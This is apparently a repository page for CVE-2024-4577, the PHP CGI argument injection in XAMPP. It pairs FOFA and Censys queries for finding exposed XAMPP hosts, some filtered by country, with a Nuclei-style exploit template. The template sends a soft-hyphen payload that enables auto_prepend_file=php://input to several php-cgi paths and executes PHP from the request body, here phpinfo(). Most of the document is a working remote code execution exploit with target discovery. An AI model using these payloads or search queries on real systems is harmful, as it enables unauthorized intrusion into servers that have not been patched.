# CVE-2024-4577


# FOFA Search：
header="Xampps_info" || body="/xampps.jpg" || (header="location http" && header="xampp") || body="content=\"Kai Oswald Seidler" || title="XAMPP for" || title="XAMPP Version" || body="font-size: 1.2em; color: red;\">New XAMPP"
# Censys Search：
https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per_page=25&virtual_hosts=EXCLUDE&q=%28services.http.response.body%3A+%22XAMPP%22+OR+services.http.response.headers.server%3A+%22XAMPP%22%29+


# POC：
id: CVE-2024-4577
info:
  name: PHP CGI Argument Injection (CVE-2024-4577) Remote Code Execution
  author: Hu$SHA
  description: Allowing unauthenticated attackers to execute arbitrary code on remote XAMPP servers through specific character sequences(0xAD)
  reference:
    - https://github.com/VictorShem/CVE-2024-4577
  severity: critical
  tags: cve, rce, php

  metadata:
    fofa-query:
      - 'app="XAMPP"'
      - 'app="XAMPP" && country=JP'
      - 'app="XAMPP" && country=CN'

variables:
  payload: "?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"

http:
  - method: POST
    path:
      - "{{BaseURL}}/index.php{{payload}}"
      - "{{BaseURL}}/cgi-bin/php-cgi.exe{{payload}}"
      - "{{BaseURL}}/php-cgi/php-cgi.exe{{payload}}"
      - "{{BaseURL}}/php-cgi/php.exe{{payload}}"
      - "{{BaseURL}}/cgi-bin/php.exe{{payload}}"
      
    headers:
      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.2; rv:122.0) Gecko/20000101 Firefox/122.0"
      Accept: "*/*"
      Content-Type: "application/x-www-form-urlencoded"
      Connection: "keep-alive"
      REDIRECT-STATUS: "1"

    body: "<?php phpinfo(); ?>"
      
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "PHP Version")'
        condition: and
